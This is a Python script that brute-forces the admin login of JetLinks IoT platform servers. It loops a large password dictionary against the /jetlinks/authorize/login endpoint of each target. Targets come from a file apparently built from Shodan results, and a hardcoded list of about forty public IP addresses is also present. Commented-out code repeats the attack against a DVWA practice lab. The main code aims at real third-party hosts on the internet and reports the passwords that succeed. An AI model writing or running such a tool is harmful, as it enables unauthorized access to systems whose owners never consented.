import requests
import re
import json

headers = {
    "Cookie": "security=low; PHPSESSID=dspqpd9s5b32u1tc6c4j5ind4c"
}


ip = "101.34.143.5:8888"  # localhost
# url = "http://101.34.143.5:8888/vulnerabilities/brute/?username=admin&password=password&Login=Login"


url = "http://192.168.19.185:9000/jetlinks/authorize/login"
# res = requests.get(url,headers=headers)

def test_vun(ip):
    url="http://{}/jetlinks/authorize/login".format(ip)
    with open('./somd5-top1w.txt', 'r') as f:
        lines = f.readlines()
        for index,line in enumerate(lines):
            password = line.strip('\n')
            json = {"username": "admin", "password": password, "expires": 3600000,
                    "tokenType": "default", "verifyKey": "",
                    "verifyCode": ""}
            try:
                resp = requests.post(url, json=json)
            except requests.ConnectionError :
                print("Error")
                return False
            if resp.status_code==404:
                return False
            if resp.status_code==400 and '验证码' in resp.text:
                return False
            if '密码' in resp.text:
                if index%100==0: print('{} password incorrect,retrying {}'.format(ip,index))
                continue
            if resp.status_code==200:
                return {'ip':ip,'password':password}
            else:
                print(resp.text)
                return False
            print(resp.json())
    return False



# fileusernames = open("names.txt","r")
# usernames = fileusernames.readlines()
# filepasswords = open("dict.txt","r")
# passwords = filepasswords.readlines()
#
# for username in usernames:
#     for password in passwords:
#         response = requests.get(url+"?username="+username[:-1]+"&password="+password[:-1]+"&Login=Login", headers=headers) # low & medium #
#         if not re.findall("Username and/or password incorrect", response.text):
#             print(username[:-1]+":"+password[:-1])
def main():
    print('a')
    i = ['103.105.12.9:8081', '103.53.208.124:9000', '8.129.63.167:9000', '120.77.179.54:9000', '119.3.178.219:9000',
     '116.62.13.96:9000', '47.96.146.203:9000', '8.140.176.200:9000', '183.66.213.162:9001', '218.5.40.188:9000',
     '218.2.244.252:9000', '120.24.221.59:9000', '47.115.137.250:9000', '212.64.24.106:9000', '106.52.172.175:9000',
     '106.52.62.249:9000', '121.89.218.53:9000', '47.115.15.163:9000', '1.116.83.46:9000', '49.232.217.208:9001',
     '47.114.2.130:9000', '218.6.235.160:9000', '106.14.227.207:9000', '81.71.43.195:9000', '39.100.144.247:9000',
     '103.21.143.220:8081', '42.192.192.232:9000', '1.14.140.229:9000', '60.205.191.173:9000', '116.62.218.11:9001',
     '8.134.88.11:9000', '139.155.178.149:9000', '8.129.120.70:9000', '121.36.77.196:9000', '82.157.36.172:9000',
     '8.136.153.162:9000', '47.118.42.11:9000', '218.6.236.224:9000', '47.108.229.57:9000', '114.115.184.213:9000',
     '118.190.246.141:7001']
    success_ip=[]
    with open('./data/jetlinks_shodan_ip.json', 'r') as f:
        ip_li = json.load(f)
        for ip in ip_li:
            if test_vun(ip):
                success_ip.append(ip)
                print('{} success'.format(ip))
            else:
                print('{} failed'.format(ip))
if __name__ == '__main__':
    main()